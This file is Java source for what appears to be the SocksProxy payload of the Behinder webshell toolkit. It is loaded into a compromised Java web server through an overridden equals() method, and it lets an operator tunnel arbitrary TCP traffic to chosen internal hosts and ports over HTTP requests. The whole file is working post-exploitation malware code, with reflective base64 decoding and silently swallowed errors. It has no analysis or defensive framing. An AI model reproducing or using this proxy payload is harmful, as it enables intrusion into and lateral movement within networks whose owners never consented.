package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Map;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class SocksProxy {
   public static String cmd;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String extraData;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public boolean equals(Object obj) {
      try {
         this.fillContext(obj);
         this.proxy();
      } catch (Exception var3) {
      }

      return true;
   }

   public void proxy() throws Exception {
      HttpServletRequest request = (HttpServletRequest)this.Request;
      HttpServletResponse response = (HttpServletResponse)this.Response;
      HttpSession session = this.Session;
      if (cmd != null) {
         if (cmd.compareTo("CONNECT") == 0) {
            ServletOutputStream so;
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               SocketChannel socketChannel = SocketChannel.open();
               socketChannel.connect(new InetSocketAddress(target, port));
               socketChannel.configureBlocking(false);
               session.setAttribute("socket_" + socketHash, socketChannel);
               response.setStatus(200);
            } catch (UnknownHostException var9) {
               so = response.getOutputStream();
               so.write(new byte[]{56, 33, 73, 55});
               so.write(var9.getMessage().getBytes());
               so.flush();
               so.close();
            } catch (IOException var10) {
               so = response.getOutputStream();
               so.write(new byte[]{56, 33, 73, 55});
               so.write(var10.getMessage().getBytes());
               so.flush();
               so.close();
            }
         } else {
            SocketChannel socketChannel;
            if (cmd.compareTo("DISCONNECT") == 0) {
               try {
                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
                  socketChannel.socket().close();
               } catch (Exception var8) {
               }

               session.removeAttribute("socket_" + socketHash);
            } else {
               ServletOutputStream so = null;
               if (cmd.compareTo("READ") == 0) {
                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);

                  try {
                     ByteBuffer buf = ByteBuffer.allocate(512);
                     int bytesRead = socketChannel.read(buf);
                     for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                  } catch (Exception var12) {
                     response.setStatus(200);
                     so = response.getOutputStream();
                     so.write(new byte[]{56, 33, 73, 55});
                     so.write(var12.getMessage().getBytes());
                     so.flush();
                     so.close();
                     socketChannel.socket().close();
                  } catch (Error var13) {
                  }
               } else if (cmd.compareTo("FORWARD") == 0) {
                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);

                  try {
                     byte[] extraDataByte = this.base64decode(extraData);
                     ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                     buf.clear();
                     buf.put(extraDataByte);
                     buf.flip();

                     while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                     }
                  } catch (Exception var11) {
                     so = response.getOutputStream();
                     so.write(new byte[]{56, 33, 73, 55});
                     so.write(var11.getMessage().getBytes());
                     so.flush();
                     so.close();
                     socketChannel.socket().close();
                  }
               }
            }
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
